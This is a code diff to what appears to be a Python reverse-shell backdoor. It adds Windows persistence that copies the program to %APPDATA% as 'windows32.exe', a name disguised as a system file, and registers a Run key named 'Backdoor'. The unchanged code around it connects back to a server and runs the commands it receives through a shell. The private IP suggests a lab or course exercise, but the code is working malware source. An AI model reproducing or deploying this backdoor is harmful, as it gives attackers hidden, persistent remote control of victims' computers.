@@ -5,6 +5,8 @@ import subprocess
 import json
 import os
 import base64
+import shutil
+import sys
 
 def reliable_send(data):
     json_data = json.dumps(data)
@@ -40,6 +42,12 @@ def shell():
             proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = proc.stdout.read() + proc.stderr.read()
             reliable_send(result)
+
+location = os.environ["appdata"] + "\\windows32.exe"
+if not os.path.exists(location):
+    shutil.copyfile(sys.executable, location)
+    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d"'+ location +'"', shell=True)
+
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.connect(("10.0.2.15",54321))#Change to Server IP
